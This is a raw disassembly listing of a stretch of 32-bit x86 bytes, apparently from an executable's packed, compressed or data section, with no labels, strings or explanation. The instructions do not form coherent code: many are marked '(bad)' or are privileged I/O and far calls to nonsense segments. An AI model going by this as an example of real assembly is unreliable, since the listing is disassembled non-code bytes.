  409e4b:	xchg   edx,eax
  409e4c:	or     al,0x14
  409e4e:	or     edi,DWORD PTR [eax+0x44]
  409e51:	xlat   BYTE PTR ds:[ebx]
  409e52:	lods   eax,DWORD PTR ds:[esi]
  409e53:	xchg   edi,eax
  409e54:	xor    eax,DWORD PTR [eax+0x16]
  409e57:	mov    fs,WORD PTR [edi]
  409e59:	cs xchg ecx,eax
  409e5b:	xchg   ebx,eax
  409e5c:	adc    ebp,0x8
  409e5f:	scas   eax,DWORD PTR es:[edi]
  409e60:	push   ecx
  409e61:	idiv   DWORD PTR [ebp-0x50482d72]
  409e67:	ins    BYTE PTR es:[edi],dx
  409e68:	js     0x409e3a
  409e6a:	jnp    0x409e03
  409e6c:	jg     0x409e2a
  409e6e:	cdq    
  409e6f:	int    0x42
  409e71:	ds push 0x387c4680
  409e77:	cmc    
  409e78:	push   cs
  409e79:	outs   dx,BYTE PTR ds:[esi]
  409e7a:	xchg   ebx,eax
  409e7b:	(bad)  
  409e7c:	cmc    
  409e7d:	mov    cl,0x9b
  409e7f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409e80:	in     eax,0x90
  409e82:	inc    ecx
  409e83:	mov    ecx,0xc1dcd4f2
  409e88:	cdq    
  409e89:	test   eax,0xfb9518
  409e8e:	add    al,0xed
  409e90:	push   ds
  409e91:	jmp    0x1cd09744
  409e96:	dec    edx
  409e97:	mov    cl,0x22
  409e99:	mov    ds:0xfaab8b90,eax
  409e9e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409e9f:	iret   
  409ea0:	pop    es
  409ea1:	sub    eax,0x571fbb9e
  409ea6:	pop    eax
  409ea7:	add    eax,0xf4f4339e
  409eac:	mov    ds:0xf0dcfbc2,eax
  409eb1:	sbb    bl,BYTE PTR [ebx-0x3326fa04]
  409eb7:	mov    WORD PTR ds:0x437d7874,?
  409ebd:	add    ch,BYTE PTR [ebp-0x28]
  409ec0:	push   ebp
  409ec1:	sub    BYTE PTR [ecx+0x4b],ch
  409ec4:	xchg   BYTE PTR [ecx],dh
  409ec6:	lahf   
  409ec7:	sahf   
  409ec8:	add    dl,BYTE PTR [eax-0x114ddab8]
  409ece:	lods   eax,DWORD PTR ds:[esi]
  409ecf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409ed0:	or     BYTE PTR [ecx-0x3c378ac7],ah
  409ed6:	inc    esi
  409ed7:	out    0xa0,eax
  409ed9:	dec    esi
  409eda:	push   esp
  409edb:	shr    DWORD PTR [eax],cl
  409edd:	sbb    DWORD PTR [edx],ebx
  409edf:	loope  0x409f1a
  409ee1:	repz inc esi
  409ee3:	mov    ebx,0x1d5b8bf1
  409ee8:	es jne 0x409e9c
  409eeb:	cs call 0xbad6:0x9194088d
  409ef3:	xlat   BYTE PTR ds:[ebx]
  409ef4:	dec    esi
  409ef5:	iret   
  409ef6:	lahf   
  409ef7:	inc    ebp
  409ef8:	inc    edi
  409ef9:	cmp    DWORD PTR [edi],0xaeb4c541
  409eff:	adc    DWORD PTR [edi+0x69],esi
  409f02:	cmp    al,BYTE PTR [ebp-0x6a1efdf0]
  409f08:	in     eax,dx
  409f09:	rcr    cl,0xb1
  409f0c:	cli    
  409f0d:	mov    edi,0x4b463976
  409f12:	pop    ecx
  409f13:	stos   BYTE PTR es:[edi],al
  409f14:	or     eax,0x56fb5e45
  409f19:	dec    edx
  409f1a:	mul    DWORD PTR [edx-0x45db1ab]
  409f20:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409f21:	sub    BYTE PTR [ebx+ebx*4-0x7625ffa5],cl
  409f28:	popa   
  409f29:	aaa    
  409f2a:	es (bad) 
  409f2c:	dec    esi
  409f2d:	sbb    al,0x6f
  409f2f:	ins    BYTE PTR es:[edi],dx
  409f30:	and    al,0x68
  409f32:	pusha  
  409f33:	inc    ebx
  409f34:	retf   
  409f35:	scas   al,BYTE PTR es:[edi]
  409f36:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409f37:	repz out dx,al
  409f39:	pop    ebp
  409f3a:	pop    edi
  409f3b:	(bad)  
  409f3c:	pop    ss
  409f3d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409f3e:	push   esi
  409f3f:	mov    ebx,0xf058e891
  409f44:	(bad)  
  409f45:	fldenv [ecx+ebp*2-0x51]
  409f49:	inc    edx
  409f4a:	sbb    DWORD PTR [ebp+0x25f03],esi
  409f50:	sub    al,0x48
  409f52:	pusha  
  409f53:	or     ebx,0x2f
  409f56:	mov    DWORD PTR [ecx-0x57],eax
  409f59:	aad    0xc9
  409f5b:	mov    edi,DWORD PTR ds:0xaca7661a
  409f61:	pop    edx
  409f62:	mov    bl,BYTE PTR [edi]
  409f64:	xlat   BYTE PTR ds:[ebx]
  409f65:	sub    edx,DWORD PTR [ebp+0x47]
  409f68:	test   BYTE PTR [ecx-0x5b0e5057],0x9f
  409f6f:	popa   
  409f70:	pop    ecx
  409f71:	test   DWORD PTR [edx],0xfe8d132e
  409f77:	out    dx,al
  409f78:	lods   al,BYTE PTR ds:[esi]
  409f79:	xchg   ebp,eax
  409f7a:	cmp    al,0x90
  409f7c:	xchg   esp,eax
  409f7d:	int3   
  409f7e:	jb     0x409fce
  409f80:	data16 jne 0x409f3d
  409f83:	and    DWORD PTR [ebp+edi*1+0x31e415dc],edi
  409f8a:	jle    0x40a008
  409f8c:	pop    ss
  409f8d:	sub    edi,DWORD PTR [esi+0x34caa603]
  409f93:	xor    al,0x10
  409f95:	repnz mov esp,0x3990929e
  409f9b:	mov    cl,0x19
  409f9d:	pop    esi
  409f9e:	jmp    0x927:0x800f9e7
  409fa5:	outs   dx,DWORD PTR ds:[esi]
  409fa6:	test   al,0xbe
  409fa8:	mov    edi,0x3743602
  409fad:	clc    
  409fae:	aad    0x87
  409fb0:	retf   
  409fb1:	fidiv  WORD PTR [esi]
  409fb3:	cmp    eax,0x7fee8ca9
  409fb8:	mov    esp,0xe312ca09
  409fbd:	in     al,dx
  409fbe:	ins    DWORD PTR es:[edi],dx
  409fbf:	sahf   
  409fc0:	push   ds
  409fc1:	push   ss
  409fc2:	xor    al,0x1f
  409fc4:	jecxz  0x40a013
  409fc6:	xor    DWORD PTR [ecx],esp
  409fc8:	jne    0x40a044
  409fca:	mov    eax,0x62caf191
  409fcf:	out    0x6b,al
  409fd1:	jle    0x409fc2
  409fd3:	mov    esi,DWORD PTR [esi-0x30d47673]
  409fd9:	shl    bl,1
  409fdb:	or     al,0xac
  409fdd:	cld    
  409fde:	pop    esp
  409fdf:	or     al,0x6a
  409fe1:	out    dx,al
  409fe2:	(bad)  
  409fe3:	xor    al,0xd3
  409fe5:	iret   
  409fe6:	push   cs
  409fe7:	mov    al,ds:0xe7cdf0ab
  409fec:	or     edx,ecx
  409fee:	mov    ds:0x422d0f91,al
  409ff3:	ret    0x192
  409ff6:	loop   0x409fc1
  409ff8:	push   ebp
  409ff9:	cmc    
  409ffa:	xor    eax,0x16beaf4f
  409fff:	mov    edx,0x84658fe5
  40a004:	aad    0x84
  40a006:	sub    BYTE PTR [esi+0x1bc403f6],dh
  40a00c:	and    bl,BYTE PTR [edi+edx*4+0x2d2fecbc]
  40a013:	fild   WORD PTR [ecx+0x772ab24]
  40a019:	(bad)  
  40a01a:	cmc    
  40a01b:	jne    0x40a048
  40a01d:	mov    gs,WORD PTR [edx+0x28]
  40a020:	jg     0x40a022
  40a022:	call   0x904e:0xe39eb974
  40a029:	adc    al,BYTE PTR [edx+edi*2]
  40a02c:	(bad)  
  40a02d:	and    DWORD PTR [edx-0x1c9e4ea0],esp
  40a033:	es ins DWORD PTR es:[edi],dx
  40a035:	sub    al,0xf8
  40a037:	jb     0x40a0a3
  40a039:	mov    ?,WORD PTR [eax+esi*2-0x7d1e8a3a]
  40a040:	loopne 0x40a00d
  40a042:	dec    eax
  40a043:	pop    ss
  40a044:	cwde   
  40a045:	enter  0x37f0,0x40
  40a049:	jnp    0x40a089
  40a04b:	cmp    DWORD PTR [ebp-0xd992763],edx
  40a051:	add    al,0x5f
  40a053:	clc    
  40a054:	and    al,0x32
  40a056:	sar    DWORD PTR ds:0x80ef64dd,0x5b
  40a05d:	dec    ebx
  40a05e:	sub    eax,0x7963c996
  40a063:	(bad)  [ecx]
  40a065:	test   BYTE PTR [eax],cl
  40a067:	pushf  
  40a068:	and    DWORD PTR [ebp-0x7d6ad48f],ebp
  40a06e:	jle    0x40a0c8
  40a070:	pop    ebp
  40a071:	add    eax,0xeb860019
  40a076:	cdq    
  40a077:	cmp    al,0xe6
  40a079:	into   
  40a07a:	mov    ch,0x27
  40a07c:	mov    bh,0xc0
  40a07e:	lods   al,BYTE PTR ds:[esi]
  40a07f:	fwait
  40a080:	xor    al,BYTE PTR [ebp-0x25c7d0de]
  40a086:	cli    
  40a087:	jbe    0x40a108
  40a089:	jae    0x40a020
  40a08b:	icebp  
  40a08c:	daa    
  40a08d:	xchg   edx,eax
  40a08e:	sub    dl,bh
  40a090:	push   ss
  40a091:	or     dl,BYTE PTR [ebx-0x769c8de3]
  40a097:	xor    BYTE PTR [ebp-0x36],0xb8
  40a09b:	mov    ah,0xe7
  40a09d:	push   ebx
  40a09e:	lock dec esp
  40a0a0:	outs   dx,BYTE PTR ds:[esi]
  40a0a1:	retf   0x1e8b
  40a0a4:	aam    0x39
  40a0a6:	pop    esi
  40a0a7:	fsub   DWORD PTR es:[ecx]
  40a0aa:	neg    BYTE PTR [ebx+ebp*8]
  40a0ad:	mov    bl,0xee
  40a0af:	(bad)  
  40a0b0:	fbstp  TBYTE PTR [ecx+ecx*8]
  40a0b3:	sbb    eax,0xbda31b96
  40a0b8:	pop    esi
  40a0b9:	add    BYTE PTR [edx-0x28c0ac26],bl
  40a0bf:	bound  ecx,QWORD PTR [edi-0x26]
  40a0c2:	or     al,0x9a
  40a0c4:	sbb    edi,DWORD PTR [edi]
  40a0c6:	cmc    
  40a0c7:	pop    eax
  40a0c8:	sbb    BYTE PTR [ebp+0x7],al
  40a0cb:	rol    DWORD PTR [eax],0x7d
  40a0ce:	mov    bh,0x81
  40a0d0:	adc    DWORD PTR [edi-0x62529e6a],edi
  40a0d6:	retf   
  40a0d7:	adc    edi,ebx
  40a0d9:	dec    esi
  40a0da:	add    DWORD PTR [esi+ebx*2],esp
  40a0dd:	and    eax,0x4142f0c7
  40a0e2:	imul   edi,edx,0xce41b5c1
  40a0e8:	inc    esp
  40a0e9:	(bad)
  40a0ec:	or     cl,BYTE PTR [ecx]
  40a0ee:	inc    edi
  40a0ef:	adc    dl,BYTE PTR [esi+0x2]
  40a0f2:	lods   al,BYTE PTR ds:[esi]
  40a0f3:	repz or BYTE PTR [ebx+0x7b],cl
  40a0f7:	pop    es
  40a0f8:	mov    esi,0x7441b8bd
  40a0fd:	sbb    al,0xec
  40a0ff:	retf   0xdc5a
  40a102:	pop    edi
  40a103:	das    
  40a104:	or     BYTE PTR ds:0x76344ca9,al
  40a10a:	xchg   esp,eax
  40a10b:	mov    ebp,0xacd8b7e6
  40a110:	es xor ah,dh
  40a113:	inc    DWORD PTR [edx+0x4e4c2322]
  40a119:	mul    BYTE PTR [edi]
  40a11b:	pop    eax
  40a11c:	test   BYTE PTR [esi],bl
  40a11e:	cwde   
  40a11f:	popa   
  40a120:	je     0x40a0ee
  40a122:	(bad)  
  40a123:	push   ecx
  40a124:	inc    esi
  40a125:	retf   
  40a126:	push   eax
  40a127:	pop    ss
  40a128:	test   eax,0x175107af
  40a12d:	sub    dl,ah
  40a12f:	xchg   DWORD PTR [ebp-0x4a],eax
  40a132:	push   edi
  40a133:	add    eax,edi
  40a135:	addr16 aad 0xdb
  40a138:	addr16 retf 0xca28
  40a13c:	repz rcr esi,0xe2
  40a140:	cs das 
  40a142:	test   BYTE PTR [eax-0x5e],bl
  40a145:	dec    edx
  40a146:	ja     0x40a194
  40a148:	sub    BYTE PTR [eax],dl
  40a14a:	sbb    al,0x8
  40a14c:	mov    DWORD PTR [edi-0x6304ed9f],edx
  40a152:	jns    0x40a1c3
  40a154:	xor    eax,0x970b6317
  40a159:	mov    ds:0xe7415a8e,eax
  40a15e:	popf   
  40a15f:	push   es
  40a160:	mov    bh,0xb6
  40a162:	cmp    BYTE PTR [eax-0x5a2a31f7],bl
  40a168:	popa   
  40a169:	stos   BYTE PTR es:[edi],al
  40a16a:	sub    al,0x60
  40a16c:	pop    esi
  40a16d:	pop    esi
  40a16e:	shr    ah,1
  40a170:	pop    esi
  40a171:	int3   
  40a172:	push   0xfffffff5
  40a174:	sub    ebx,ebx
  40a176:	retf   
  40a177:	stc    
  40a178:	or     eax,DWORD PTR [esi-0x5c]
  40a17b:	cmp    dl,BYTE PTR [edx-0x74aa391a]
  40a181:	adc    DWORD PTR [edi],ebp
  40a183:	fucomi st,st(3)
  40a185:	sub    BYTE PTR [ebx-0x2fef16de],0x79
  40a18c:	ficomp WORD PTR [esi-0x1dffc365]
  40a192:	popa   
  40a193:	ror    BYTE PTR ds:0xf3524690,1
  40a199:	xchg   edi,eax
  40a19a:	fndisi(8087 only) 
  40a19c:	push   0x5e2a9b30
  40a1a1:	jnp    0x40a1c2
  40a1a3:	xchg   ecx,eax
  40a1a4:	ret    0x80b1
  40a1a7:	in     al,dx
  40a1a8:	lahf   
  40a1a9:	movs   BYTE PTR es:[edi],BYTE PTR gs:[esi]
  40a1ab:	xlat   BYTE PTR ds:[ebx]
  40a1ac:	cmp    eax,0x95e8d3bd
  40a1b1:	sbb    al,al
  40a1b3:	test   ebp,0xe1b1ca07
  40a1b9:	jbe    0x40a165
  40a1bb:	push   ebx
  40a1bc:	fcom   st(0)
  40a1be:	xchg   BYTE PTR [ebp+0x5f],dh
  40a1c1:	stos   BYTE PTR es:[edi],al
  40a1c2:	and    al,0xf2
  40a1c4:	or     DWORD PTR ds:0x941594c7,esp
  40a1ca:	mov    esp,0xf4234737
  40a1cf:	adc    ecx,DWORD PTR [edi-0x18caf4ef]
  40a1d5:	sbb    al,0xb0
  40a1d7:	mov    esp,0x4ebedb8c
  40a1dc:	fcomp  QWORD PTR [ecx+eiz*4-0xa37540a]
  40a1e3:	jbe    0x40a1a0
  40a1e5:	sbb    BYTE PTR [ecx+0x13],dl
  40a1e8:	sbb    al,0x3c
  40a1ea:	and    edx,esp
  40a1ec:	bound  edi,QWORD PTR [esi-0x5a]
  40a1ef:	jle    0x40a220
  40a1f1:	arpl   WORD PTR [eax],si
  40a1f3:	fidiv  DWORD PTR [ebx]
  40a1f5:	in     eax,dx
  40a1f6:	out    0x1,al
  40a1f8:	sub    BYTE PTR [ebx+0x5f],dh
  40a1fb:	outs   dx,BYTE PTR ds:[esi]
  40a1fc:	clc    
  40a1fd:	pop    esi
  40a1fe:	and    al,0xa1
  40a200:	retf   0x1b4c
  40a203:	mov    al,0xf6
  40a205:	push   es
  40a206:	bound  eax,QWORD PTR [esp+eiz*4]
  40a209:	jo     0x40a1e9
  40a20b:	ja     0x40a27a
  40a20d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a20e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a20f:	scas   al,BYTE PTR es:[edi]
  40a210:	sbb    al,0xbf
  40a212:	mov    ebp,0x11b4cb34
  40a217:	pushf  
  40a218:	dec    ebp
  40a219:	cld    
  40a21a:	mov    bl,0xc2
  40a21c:	push   ebp
  40a21d:	ins    DWORD PTR es:[edi],dx
  40a21e:	or     BYTE PTR [edi+edi*8],ch
  40a221:	sbb    eax,0x7e0b22ed
  40a226:	sub    edi,DWORD PTR [esp+esi*4]
  40a229:	xor    eax,0xb798f8a4
  40a22e:	fnsave [edi+eiz*8-0x42]
  40a232:	sbb    ch,BYTE PTR [edi-0x3dc825a7]
  40a238:	repnz xchg esi,eax
  40a23a:	mov    al,0x1c
  40a23c:	or     BYTE PTR cs:[ebp-0x53],bl
  40a240:	inc    edi
  40a241:	jnp    0x40a23c
  40a243:	ds adc al,0x52
  40a246:	dec    esi
  40a247:	test   eax,0x90566a6d
  40a24c:	adc    DWORD PTR [ebp-0x58],edx
  40a24f:	(bad)  
  40a250:	(bad)  
  40a251:	pop    edx
  40a252:	adc    bl,BYTE PTR [ecx+ebx*2]
  40a255:	pop    ebx
  40a256:	mov    ch,0xb9
  40a258:	jo     0x40a27b
  40a25a:	add    eax,0xc03eeb35
  40a25f:	fstp   QWORD PTR [ebx]
  40a261:	pop    ebp
  40a262:	sub    DWORD PTR [ebp-0x67],0xffffff8f
  40a266:	cdq    
  40a267:	int3   
  40a268:	in     eax,dx
  40a269:	cs inc eax
  40a26b:	cdq    
  40a26c:	mov    edx,0xb3f93276
  40a271:	call   0x5399c159
  40a276:	sbb    eax,0xb95f12e
  40a27b:	pop    ebp
  40a27c:	call   0x6bd0a0ae
  40a281:	jbe    0x40a290
  40a283:	inc    ecx
  40a284:	inc    BYTE PTR [edx+0x71]
  40a287:	push   ebx
  40a288:	imul   edi,DWORD PTR [eax+0x38],0x774fca90
  40a28f:	out    0x24,al
  40a291:	cmp    DWORD PTR [ecx+0x65],esi
  40a294:	mov    ?,ecx
  40a296:	jl     0x40a273
  40a298:	out    dx,al
  40a299:	mov    dl,0xc2
  40a29b:	push   edi
  40a29c:	and    BYTE PTR [eax-0x2],bl
  40a29f:	pop    ds
  40a2a0:	scas   eax,DWORD PTR es:[edi]
  40a2a1:	mov    ?,ebx
  40a2a3:	data16 jnp 0x40a2ab
  40a2a6:	mov    dl,0x4e
  40a2a8:	add    dl,ah
  40a2aa:	or     al,0xf2
  40a2ac:	sahf   
  40a2ad:	je     0x40a31d
  40a2af:	xchg   DWORD PTR [eax+0x70a39a3c],ebx
  40a2b5:	popa   
  40a2b6:	leave  
  40a2b7:	cs es (bad) 
  40a2ba:	outs   dx,DWORD PTR ds:[esi]
  40a2bb:	scas   al,BYTE PTR es:[edi]
  40a2bc:	je     0x40a258
  40a2be:	mov    bl,0xe6
  40a2c0:	adc    eax,0x77922808
  40a2c5:	adc    al,0xb6
  40a2c7:	addr16 add eax,0xe964b2b1
  40a2cd:	mov    ebp,0x1fb3652c
  40a2d2:	mov    esp,DWORD PTR [ecx+0x3bba5829]
  40a2d8:	cmp    bh,BYTE PTR [esi]
  40a2da:	and    dh,ah
  40a2dc:	mov    dl,0xad
  40a2de:	pop    es
  40a2df:	inc    edx
  40a2e0:	mov    ebx,0x8be38d9e
  40a2e5:	xor    BYTE PTR ds:0xae8e71f5,0x82
  40a2ec:	cmc    
  40a2ed:	cmp    DWORD PTR [edx-0x4e],eax
  40a2f0:	out    0x9b,eax
  40a2f2:	int    0x74
  40a2f4:	push   esp
  40a2f5:	xor    dl,dl
  40a2f7:	push   edx
  40a2f8:	mov    cl,0x31
  40a2fa:	cmc    
  40a2fb:	mov    bh,0x8d
  40a2fd:	dec    ebp
  40a2fe:	stc    
  40a2ff:	out    dx,al
  40a300:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a301:	in     al,dx
  40a302:	pop    ebx
  40a303:	les    ebp,FWORD PTR [esi]
  40a305:	sub    edx,ebx
  40a307:	inc    edi
  40a308:	mov    al,0x7d
  40a30a:	(bad)  
  40a30b:	stc    
  40a30c:	shr    DWORD PTR [edx+0x3697873d],cl
  40a312:	repnz (bad) 
  40a314:	mov    esi,eax
  40a316:	inc    ebx
  40a317:	add    al,0x32
  40a319:	out    dx,eax
  40a31a:	ds es ja 0x40a357
  40a31e:	ins    BYTE PTR es:[edi],dx
  40a31f:	xchg   esp,eax
  40a320:	outs   dx,DWORD PTR ds:[esi]
  40a321:	xlat   BYTE PTR ds:[ebx]
  40a322:	cdq    
  40a323:	shr    DWORD PTR [edx],1
  40a325:	sub    edi,esi
  40a327:	jecxz  0x40a2f4
  40a329:	loope  0x40a35f
  40a32b:	add    BYTE PTR fs:[esi],cl
  40a32e:	and    al,ch
  40a330:	icebp  
  40a331:	xchg   ebx,eax
  40a332:	in     al,dx
  40a333:	shl    dh,1
  40a335:	and    al,0xe4
  40a337:	cmp    ch,BYTE PTR [edx-0x64d5a468]
  40a33d:	shl    cl,1
  40a33f:	popf   
  40a340:	nop
  40a341:	jnp    0x40a2db
  40a343:	mov    ecx,0x9c9293af
  40a348:	jg     0x40a300
  40a34a:	retf   
  40a34b:	in     al,dx
  40a34c:	dec    edx
  40a34d:	ss shr ecx,1
  40a350:	inc    ebx
  40a351:	jb     0x40a34c
  40a353:	or     eax,0x93e68985
  40a358:	cdq    
  40a359:	ja     0x40a35f
  40a35b:	fbstp  TBYTE PTR [ebp-0x1c75653c]
  40a361:	in     al,0xbc
  40a363:	push   ds
  40a364:	dec    edi
  40a365:	push   ebp
  40a366:	sbb    DWORD PTR ds:0x4411b4c8,edi
  40a36c:	retf   
  40a36d:	xchg   ebx,eax
  40a36e:	push   ebx
  40a36f:	mov    bh,al
  40a371:	fist   WORD PTR [ebx-0x352b126]
  40a377:	sub    al,0xce
  40a379:	dec    ebx
  40a37a:	pop    ebx
  40a37b:	lahf   
  40a37c:	sub    BYTE PTR [eax-0x5558337f],al
  40a382:	sbb    eax,0xdd5a1e24
  40a387:	and    ah,BYTE PTR [ecx-0x5]
  40a38a:	ins    DWORD PTR es:[edi],dx
  40a38b:	iret   
  40a38c:	mov    ecx,edx
  40a38e:	dec    eax
  40a38f:	or     bh,0x7c
  40a392:	add    edx,DWORD PTR [eax]
  40a394:	mov    ds:0x33920533,al
  40a399:	mov    al,0x98
  40a39b:	mov    ebp,0x1021b385
  40a3a0:	sahf   
  40a3a1:	pop    ss
  40a3a2:	mov    al,0x71
  40a3a4:	mov    edi,0x53c33cfd
  40a3a9:	icebp  
  40a3aa:	inc    ebx
  40a3ab:	stc    
  40a3ac:	xchg   edx,eax
  40a3ad:	call   0xe233:0xa9ae9143
  40a3b4:	imul   ebp,DWORD PTR [edx+0x6584ea8],0xffffff9a
  40a3bb:	rcl    BYTE PTR [ebx+0x6f],1
  40a3be:	mov    BYTE PTR [eax+edi*1-0x3a],dh
  40a3c2:	mov    ch,BYTE PTR [eax]
  40a3c4:	mov    ah,0x75
  40a3c6:	fisttp WORD PTR ds:0x16dd5df8
  40a3cc:	pop    ebp
  40a3cd:	sbb    eax,0xff4b8633
  40a3d2:	cwde   
  40a3d3:	test   ecx,edx
  40a3d5:	cmpxchg BYTE PTR [eax+0x64],dl
  40a3d9:	loopne 0x40a43f
  40a3db:	iret   
  40a3dc:	fdivr  QWORD PTR [eax-0x5]
  40a3df:	ret    0xff1c
  40a3e2:	stos   BYTE PTR es:[edi],al
  40a3e3:	jge    0x40a382
  40a3e5:	stos   BYTE PTR es:[edi],al
  40a3e6:	inc    esp
  40a3e7:	pusha  
  40a3e8:	mov    dh,0x3d
  40a3ea:	jg     0x40a460
  40a3ec:	shl    bh,0xcf
  40a3ef:	fst    DWORD PTR [edx-0x68]
  40a3f2:	popa   
  40a3f3:	test   BYTE PTR [edx+0x21f7c623],cl
  40a3f9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a3fa:	lods   eax,DWORD PTR fs:[esi]
  40a3fc:	xor    al,0xde
  40a3fe:	mov    bh,0xd6
  40a400:	fldenv [ecx]
  40a402:	mov    WORD PTR [ebp-0xc],fs
  40a405:	cmp    al,0x4e
  40a407:	imul   ebx
  40a409:	shl    ebx,1
  40a40b:	xlat   BYTE PTR ds:[ebx]
  40a40c:	xchg   ebx,eax
  40a40d:	xchg   edx,eax
  40a40f:	out    dx,al
  40a410:	out    dx,al
  40a411:	gs scas eax,DWORD PTR es:[edi]
  40a413:	push   cs
  40a414:	fs out dx,eax
  40a416:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a417:	(bad)  [ebx-0x3e5e743f]
  40a41d:	aas    
  40a41e:	push   ds
  40a41f:	cmp    ecx,edi
  40a421:	sub    al,0x6b
  40a423:	(bad)  
  40a424:	sub    ch,bh
  40a426:	xchg   ecx,eax
  40a427:	rcr    DWORD PTR [ebx-0x2376964e],0x1d
  40a42e:	bound  ecx,QWORD PTR [edx]
  40a430:	xchg   DWORD PTR [eax],esp
  40a432:	(bad)  
  40a433:	and    DWORD PTR [ebx-0x1d],ecx
  40a436:	fidiv  WORD PTR [ecx]
  40a438:	(bad)  
  40a43a:	push   ecx
  40a43b:	inc    edx
  40a43c:	adc    esp,DWORD PTR [edi]
  40a43e:	loop   0x40a488
  40a440:	xor    DWORD PTR ds:0xd1242af8,ebx
  40a446:	mov    bl,0x3
  40a448:	es int3 
  40a44a:	mov    ebp,DWORD PTR [edx-0x6e335fdb]
  40a450:	pop    edx
  40a451:	std    
  40a452:	adc    al,BYTE PTR [ecx]
  40a454:	das    
  40a455:	stos   DWORD PTR es:[edi],eax
  40a456:	arpl   WORD PTR [ecx-0x49],di
  40a459:	es ret 0x13c0
  40a45d:	psubb  mm4,mm6
  40a460:	dec    eax
  40a461:	push   ss
  40a462:	leave  
  40a463:	pop    ds
  40a464:	jbe    0x40a4dd
  40a466:	jns    0x40a411
  40a468:	int    0xe6
  40a46a:	retfw  0xe6f7
  40a46e:	cmp    BYTE PTR [eax],bh
  40a470:	out    dx,al
  40a471:	aam    0x5
  40a473:	sbb    al,0x53
  40a475:	popa   
  40a476:	push   edi
  40a477:	adc    eax,ebp
  40a479:	inc    ebx
  40a47a:	jp     0x40a47a
  40a47c:	ss ja  0x40a446
  40a47f:	mov    dh,BYTE PTR [ebp-0x75]
  40a482:	jge    0x40a478
  40a484:	adc    edi,esi
  40a486:	jmp    0x40c7d7
  40a48b:	jmp    0x40a4f0
  40a48d:	add    al,0xad
  40a48f:	adc    al,0xec
  40a491:	jb     0x40a4f8
  40a493:	mov    esi,0x7425054
  40a498:	test   DWORD PTR [eax+0x2e],esi
  40a49b:	rol    BYTE PTR [esi],0x7b
  40a49e:	jnp    0x40a44f
  40a4a0:	cwde   
  40a4a1:	jnp    0x40a51e
  40a4a3:	mov    ch,0x2e
  40a4a5:	ja     0x40a503
  40a4a7:	ret    0xc22c
  40a4aa:	(bad)  
  40a4ab:	inc    edi
  40a4ac:	lock in eax,0x68
  40a4af:	mov    cl,0x9a
  40a4b1:	ins    BYTE PTR es:[edi],dx
  40a4b2:	xchg   BYTE PTR [esi-0x33],dl
  40a4b5:	push   es
  40a4b6:	call   0x1a75:0x986b7505
  40a4bd:	jmp    0x40a4f0
  40a4bf:	or     eax,0x2793503f
  40a4c4:	push   edx
  40a4c5:	cwde   
  40a4c6:	les    ecx,FWORD PTR [esi]
  40a4c8:	pop    es
  40a4c9:	cmp    bh,ah
  40a4cb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a4cc:	(bad)  
  40a4cd:	lock in eax,dx
  40a4cf:	cwde   
  40a4d0:	imul   edi,DWORD PTR [ebp+0x49],0x12
  40a4d4:	out    dx,eax
  40a4d5:	mov    DWORD PTR [ecx],0x7a0601a0
  40a4db:	add    al,0x4c
  40a4dd:	push   cs
  40a4de:	adc    ch,BYTE PTR [eax-0x55]
  40a4e1:	pop    ebp
  40a4e2:	outs   dx,BYTE PTR ds:[esi]
  40a4e3:	and    BYTE PTR [esi],bh
  40a4e5:	data16 cmp al,0x16
  40a4e8:	jmp    0x76822c56
  40a4ed:	mov    ecx,0x3029bdf1
  40a4f2:	xchg   edi,eax
  40a4f3:	dec    ecx
  40a4f4:	jne    0x40a4a8
  40a4f6:	int3   
  40a4f7:	loop   0x40a523
  40a4f9:	or     BYTE PTR [edx+ebp*8],bl
  40a4fc:	xchg   bh,dh
  40a4fe:	inc    edx
  40a4ff:	inc    esi
  40a500:	mov    ebx,0xd851070c
  40a505:	aad    0x29
  40a507:	stos   BYTE PTR es:[edi],al
  40a508:	add    ebp,ebp
  40a50a:	lock xchg ebp,eax
  40a50c:	ss aas 
  40a50e:	dec    ecx
  40a50f:	cmp    eax,edx
  40a511:	out    0xa8,al
  40a513:	mov    bl,0xa6
  40a515:	xor    DWORD PTR [ebx+0x57],ecx
  40a518:	inc    ecx
  40a519:	dec    eax
  40a51a:	lods   al,BYTE PTR ds:[esi]
  40a51b:	and    BYTE PTR [eax+0x6e],ch
  40a51e:	mov    eax,ds:0x59097ec
  40a523:	sbb    dh,ch
  40a525:	inc    edi
  40a526:	cmp    edx,edx
  40a528:	data16 sar dl,1
  40a52b:	adc    BYTE PTR [esi+0x5c],dh
  40a52e:	sbb    ch,BYTE PTR [ebp+esi*8-0x69]
  40a532:	jne    0x40a519
  40a534:	push   0xffffffdd
  40a536:	mov    eax,ds:0x9beb0f9b
  40a53b:	lahf   
  40a53c:	fistp  DWORD PTR [esi-0x80]
  40a53f:	stc    
  40a540:	cmc    
  40a541:	mov    ch,0x93
  40a543:	dec    edi
  40a544:	sbb    BYTE PTR [ebx],0x8d
  40a547:	js     0x40a591
  40a549:	push   ss
  40a54a:	mov    ds:0x9342c5a1,eax
  40a54f:	(bad)  
  40a550:	add    edx,eax
  40a552:	push   cs
  40a553:	hlt    
  40a554:	(bad)  
  40a555:	out    dx,al
  40a556:	or     ebp,ecx
  40a558:	sub    DWORD PTR [ebx-0x7f],edi
  40a55b:	fsub   DWORD PTR [eax+0x31]
  40a55e:	dec    ecx
  40a55f:	es jp  0x40a4f4
  40a562:	xchg   BYTE PTR [ebp+0xb],bh
  40a565:	xor    bh,BYTE PTR [edi-0x2c979a82]
  40a56b:	call   0xea476e74
  40a570:	xchg   DWORD PTR [ebx+edx*2],edi
  40a573:	xchg   ebp,eax
  40a574:	int3   
  40a575:	cld    
  40a576:	in     eax,0x2a
  40a578:	shl    BYTE PTR [esi],0x36
  40a57b:	push   es
  40a57c:	add    DWORD PTR [eax+ebp*2+0x1e4a12e0],0xe3941eb1
  40a587:	adc    edx,0x89ec8f0d
